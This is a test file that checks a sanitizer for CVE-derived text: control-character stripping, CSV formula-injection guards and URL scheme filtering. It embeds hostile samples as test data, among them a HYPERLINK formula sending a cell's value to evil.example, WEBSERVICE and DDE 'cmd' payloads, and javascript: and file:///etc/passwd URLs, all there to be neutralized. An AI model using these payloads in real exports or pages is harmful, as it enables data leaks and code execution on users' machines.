import { describe, expect, it } from 'vitest'

import { csvField, csvRow, jsonText, safeUrl, stripControls } from '../../lib/sanitize'

/**
 * The hardening CVE text drags in (M4, rule 4).
 *
 * The payloads here are the shapes a real record can carry, not invented ones:
 * product names beginning with `=`, descriptions with embedded control
 * characters, references with schemes that execute. Every case is checked
 * against what the *consumer* does — a spreadsheet decides what a cell is after
 * it has stripped the quoting, and an `href` decides what a scheme is with a URL
 * parser — rather than against what the string looks like.
 */

describe('stripControls', () => {
  it('removes C0, C1 and the bidirectional overrides', () => {
    expect(stripControls('a\u0000b')).toBe('a b')
    expect(stripControls('a\u001Fb')).toBe('a b')
    expect(stripControls('a\u007Fb')).toBe('a b')
    expect(stripControls('a\u009Bb')).toBe('a b')
    // Trojan Source: these reorder rendered text without changing what is
    // stored, so a cell can read as the opposite of its own value.
    expect(stripControls('a\u202Eb')).toBe('a b')
    expect(stripControls('a\u2066b')).toBe('a b')
  })

  it('removes the newlines that split a CSV record in half', () => {
    expect(stripControls('one\r\ntwo')).toBe('one two')
    expect(stripControls('one\ttwo')).toBe('one two')
  })

  it('collapses a run to one space rather than deleting it', () => {
    // Deleting would run the words together and hide that anything was removed.
    expect(stripControls('one\u0000\u0000\u0000two')).toBe('one two')
  })

  it('leaves ordinary text — including non-Latin scripts — alone', () => {
    expect(stripControls('Grüße, 日本語, emoji 🔒')).toBe('Grüße, 日本語, emoji 🔒')
  })
})

describe('csvField', () => {
  it('neutralizes every formula lead character', () => {
    // The four a spreadsheet executes, plus the two that are skipped so the
    // *next* character leads.
    expect(csvField('=1+1')).toBe(`"'=1+1"`)
    expect(csvField('+1')).toBe(`"'+1"`)
    expect(csvField('-1')).toBe(`"'-1"`)
    expect(csvField('@SUM(A1)')).toBe(`"'@SUM(A1)"`)
  })

  it('neutralizes the payloads that make an export fetch something', () => {
    // `=HYPERLINK` and `=WEBSERVICE` are the reason this exists: an export that
    // reaches the network when opened is a request the exporter never made.
    for (const payload of [
      '=HYPERLINK("http://evil.example/?x="&A1,"click")',
      '=WEBSERVICE("http://evil.example/")',
      "=cmd|' /C calc'!A0",
    ]) {
      expect(csvField(payload).startsWith(`"'`)).toBe(true)
    }
  })

  it('does not let a control character smuggle a formula past the check', () => {
    // `\t=cmd` is a formula: the parser skips the tab and `=` then leads. The
    // control strip runs first, so what is tested is the composition.
    const field = csvField('\t=cmd|x')
    expect(field).not.toMatch(/^"=/)
    expect(field).toContain('=cmd')
  })

  it('quotes always, and doubles the quotes inside', () => {
    expect(csvField('plain')).toBe('"plain"')
    expect(csvField('a,b')).toBe('"a,b"')
    expect(csvField('say "hi"')).toBe('"say ""hi"""')
  })

  it('renders null and undefined as an empty cell, not as the word', () => {
    expect(csvField(null)).toBe('""')
    expect(csvField(undefined)).toBe('""')
    expect(csvField(0)).toBe('"0"')
  })

  it('writes a record terminated the way RFC 4180 asks', () => {
    expect(csvRow(['a', 1, null])).toBe('"a","1",""\r\n')
  })
})

describe('jsonText', () => {
  it('strips control characters but does not add the formula guard', () => {
    // A JSON string is not a cell. Prefixing an apostrophe would corrupt the
    // value for every consumer in order to protect one.
    expect(jsonText('=1+1')).toBe('=1+1')
    expect(jsonText('a\u0000b')).toBe('a b')
  })
})

describe('safeUrl', () => {
  it('links http and https, and reports the host separately', () => {
    const safe = safeUrl('https://nvd.nist.gov/vuln/detail/CVE-2021-44228')
    expect(safe.href).toBe('https://nvd.nist.gov/vuln/detail/CVE-2021-44228')
    expect(safe.host).toBe('nvd.nist.gov')
    expect(safe.refused).toBeNull()
  })

  it('refuses every scheme that executes or reads locally', () => {
    for (const url of [
      'javascript:alert(1)',
      'JavaScript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      'blob:https://cve.meenan.dev/1234',
      'mailto:someone@example.com',
    ]) {
      const safe = safeUrl(url)
      expect(safe.href, url).toBeNull()
      expect(safe.refused, url).toBeTruthy()
    }
  })

  it('is not fooled by whitespace or control characters inside the scheme', () => {
    // The classic bypass of every regular expression that has tried: the URL
    // parser and the browser agree here because both see the stripped string.
    for (const url of ['java\tscript:alert(1)', ' javascript:alert(1)', 'java\nscript:alert(1)']) {
      expect(safeUrl(url).href, url).toBeNull()
    }
  })

  it('refuses things that are not URLs at all', () => {
    for (const value of ['', '   ', 'not a url', '//example.com/no-scheme', null, undefined, 42]) {
      expect(safeUrl(value).href).toBeNull()
    }
  })

  it('returns the parser’s normalization, not the original text', () => {
    // Two parsers reading one string differently is how a link goes somewhere
    // other than where it was shown to go.
    expect(safeUrl('https://EXAMPLE.com/a/../b').href).toBe('https://example.com/b')
  })
})
